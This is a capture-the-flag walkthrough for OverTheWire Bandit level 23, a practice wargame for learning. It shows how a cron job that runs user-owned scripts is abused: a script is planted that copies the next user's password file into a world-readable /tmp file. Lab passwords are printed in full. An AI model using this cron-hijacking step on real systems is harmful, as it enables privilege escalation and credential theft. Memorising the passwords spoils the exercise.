# Bandit Level 23

> A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Login

```shell
ssh bandit23@bandit.labs.overthewire.org -p 2220

0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Solution

```shell
cd /etc/cron.d/
```

```shell
ls -la
```

```shell
cat cronjob_bandit24
```

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```shell
cat /usr/bin/cronjob_bandit24.sh
```

```shell
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

In short the script here is search in the path `/var/spool/bandit24/foo` and then executes any shell script owned by bandit23, gives it 60 seconds to run, and then deletes it. So we can write a script to read the password for bandit 24.

```shell
mkdir /tmp/my_temp/
chmod 777 /tmp/my_temp/
```

We make directory in `/tmp/` to make a file so we can write the password on it to have the permission to read it. Then we give it `777` to make all the users have permission on it so bandit24 can write on it.
Then we have to creat the script in `/var/spool/bandit24/foo/` and make it executable.

```shell
nano /var/spool/bandit24/foo/bash_script.sh 
```

```shell
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/my_temp/password.txt
chmod 777 /tmp/my_temp/password.txt
```

```shell
chmod +x /var/spool/bandit24/foo/bash_script.sh
```

After 60 second the `password.txt` file will created and the script will deleated.

```shell
cat /tmp/my_temp/password.txt
```

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

